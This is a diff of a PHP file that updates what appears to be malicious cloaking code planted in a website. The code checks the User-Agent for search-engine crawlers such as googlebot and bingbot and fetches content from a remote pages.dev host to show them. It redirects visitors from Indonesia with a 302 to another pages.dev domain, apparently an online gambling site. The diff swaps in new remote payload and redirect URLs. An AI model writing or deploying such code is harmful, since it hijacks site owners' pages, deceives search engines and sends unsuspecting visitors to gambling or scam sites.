@@ -62,7 +62,7 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $res = strtolower($_SERVER['HTTP_USER_AGENT']);
 }
 
-$bot = "https://mitsubishi-bandung.id/webapp.html";
+$bot = "https://gacorrkang-1s6.pages.dev/";
 $file = medan($bot);
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/i";
@@ -87,7 +87,7 @@ if (php_sapi_name() === 'cli' || empty($_SERVER['REMOTE_ADDR'])) {
     header('Vary: Accept-Language, User-Agent');
 
     if ($country === 'ID') {
-        $target = 'https://webapp-neogacor.pages.dev/';
+        $target = 'https://disinipasti-gacor.pages.dev/';
 
         if (!headers_sent()) {
             header("Location: {$target}", true, 302);
